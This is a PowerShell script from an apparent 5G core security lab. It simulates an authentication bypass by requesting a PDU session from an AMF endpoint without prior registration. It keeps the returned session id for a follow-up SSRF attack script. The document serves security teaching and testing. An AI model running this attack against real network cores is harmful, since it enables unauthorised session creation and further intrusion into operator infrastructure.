# 01-pdu-without-auth.ps1
# Simulation: PDU session establishment WITHOUT prior UE registration/authentication.
# Threat: AMF/SMF do not enforce "authenticated UE" before creating a session.
#
# Flow: This script runs on your machine and sends ONE HTTP POST through the public ALB to the
# AMF route. It does NOT call registration or 5G-AKA first—so if a sessionId comes back, that
# illustrates the bypass. Optional WAF may block this POST (403) when auth cookie is required.
#
# Usage: $ALB_DNS = "your-alb-dns"; .\01-pdu-without-auth.ps1

param(
    [Parameter(Mandatory=$false)]
    # Hostname only (e.g. xxx.elb.amazonaws.com). Falls back to $env:ALB_DNS from CloudFormation output.
    [string]$BaseUrl = $env:ALB_DNS
)

if (-not $BaseUrl) { Write-Error "Set `$ALB_DNS or pass -BaseUrl"; exit 1 }
# Plain HTTP: lab ALB listener is port 80 (see netsec-base / core-services stacks).
$base = "http://$BaseUrl"

Write-Host "=== Attack 1: PDU session without prior authentication ===" -ForegroundColor Yellow
Write-Host "Requesting PDU session for SUPI imsi-001010000000001 WITHOUT calling registration first.`n"

try {
    # namf-comm path is routed to AMF. Body is empty JSON—no proof of prior auth in this script.
    $r = Invoke-WebRequest -UseBasicParsing -Method POST `
        -Uri "$base/namf-comm/v1/pdu-sessions/imsi-001010000000001" `
        -Headers @{"Content-Type"="application/json"; "x-trace-id"="attack-pdu-no-auth"} `
        -Body '{}'
    $json = $r.Content | ConvertFrom-Json
    # Successful vulnerable response includes session.sessionId (SMF/UPF allocated a PDU context).
    $sid = $json.session.sessionId
    if ($sid) {
        Write-Host "RESULT: Session created WITHOUT prior auth. SessionId = $sid" -ForegroundColor Red
        Write-Host "Risk: Attacker can obtain a valid session and use UPF forward (e.g. SSRF)."
        # Same PowerShell session can reuse this for 02-upf-ssrf.ps1 -SessionId if desired.
        $script:StolenSessionId = $sid
    } else {
        Write-Host "Response had no session (e.g. pdu_session_failed)." -ForegroundColor Gray
    }
    # Pretty-print full JSON for lab inspection.
    $r.Content | ConvertFrom-Json | ConvertTo-Json -Depth 6
} catch {
    # e.g. connection error, or 403 from WAF when PDU-without-cookie rule is active.
    Write-Host "Request failed: $_" -ForegroundColor Gray
}
